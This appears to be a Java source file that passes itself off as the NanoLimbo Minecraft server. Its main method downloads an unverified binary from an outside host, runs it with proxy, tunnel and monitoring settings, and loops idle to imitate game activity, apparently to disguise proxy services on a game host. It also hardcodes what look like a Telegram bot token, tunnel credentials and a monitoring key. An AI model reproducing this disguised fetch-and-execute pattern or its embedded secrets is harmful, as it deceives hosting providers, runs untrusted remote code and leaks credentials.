package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;

public final class NanoLimbo {
    public static void main(String[] args) {
        System.out.println("Starting XServer Hybrid Service...");
        try {
            Map<String, String> env = new HashMap<>();
            // 基础配置
            env.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
            env.put("FILE_PATH", "./world");
            env.put("NAME", "XServer-JP-Final");
            
            // 哪吒监控
            env.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
            env.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");
            
            // 核心端口逻辑：HY2 尝试直连 7777，隧道走 8080
            env.put("HY2_PORT", "7777"); 
            env.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
            env.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");
            env.put("ARGO_PORT", "8080");
            env.put("REALITY_PORT", "8080"); // 隧道内跑 VLESS

            // TG 推送
            env.put("CHAT_ID", "5677672165");
            env.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");
            
            // 优选配置
            env.put("CFIP", "spring.io");
            env.put("CFPORT", "443");

            // 下载二进制核心 (XServer 为 amd64 架构)
            String url = "https://amd64.ssss.nyc.mn/sbsh";
            Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbsh_final_" + System.currentTimeMillis());
            
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);

            ProcessBuilder pb = new ProcessBuilder(path.toString());
            pb.environment().putAll(env);
            pb.inheritIO().start();

            // 保持 Java 进程存活，模拟游戏心跳
            while (true) {
                Thread.sleep(60000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
